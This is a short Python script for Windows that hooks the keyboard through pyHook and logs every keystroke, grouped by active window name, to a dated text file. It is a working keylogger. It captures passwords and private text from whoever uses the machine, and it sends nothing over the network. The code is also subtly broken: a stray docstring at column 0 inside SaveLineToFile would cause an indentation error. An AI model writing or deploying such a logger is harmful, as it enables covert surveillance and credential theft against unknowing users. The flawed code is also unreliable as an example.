#!/usr/bin/env python
# -*- coding: utf-8 -*- 
"""FIRST TWO COMMENTS WERE NECESSARY TO SPECIFY CHARACTER ENCODING"""
import pyHook, pythoncom
from datetime import datetime

todays_date = datetime.now().strftime('%Y-%b-%d') 
""" %Y - Year with century (can be negative, 4 digits at least)
    %b - The abbreviated month name (``Jan'')
    %d - Day of the month, zero-padded (01..31) """
file_name = 'OUTPUT DIR LOCATION' + todays_date + '.txt'

line_buffer = "" #current typed line before return character
window_name = "" #current window

def SaveLineToFile(line):
    current_time = datetime.now().strftime('%H:%M:%S')
""" %H - Hour of the day, 24-hour clock, zero-padded (00..23)
    %M - Minute of the hour (00..59)
    %S - Second of the minute (00..59) """
    line = "[" + current_time + "] " + line
    todays_file = open(file_name, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file


def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    if(window_name != event.WindowName): #if typing in new window
        if(line_buffer != ""): #if line buffer is not empty
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #print to file: any non printed characters from old window

        line_buffer = "" #clear the line buffer
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #print to file: the new window name
        window_name = event.WindowName #set the new window name

    """if return or tab key pressed"""
    if(event.Ascii == 13 or event.Ascii == 9): #return key
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #print to file: the line buffer
        line_buffer = "" #clear the line buffer
        return True #exit event

    """if backspace key pressed"""
    if(event.Ascii == 8): #backspace key
        line_buffer = line_buffer[:-1] #remove last character
        return True #exit event

    """if non-normal ascii character"""
    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): #unknown character (eg arrow key, shift, ctrl, alt)
            pass #do nothing
        else:
            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
    else:
        line_buffer += chr(event.Ascii) #add pressed character to line buffer
        
    return True

hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for events﻿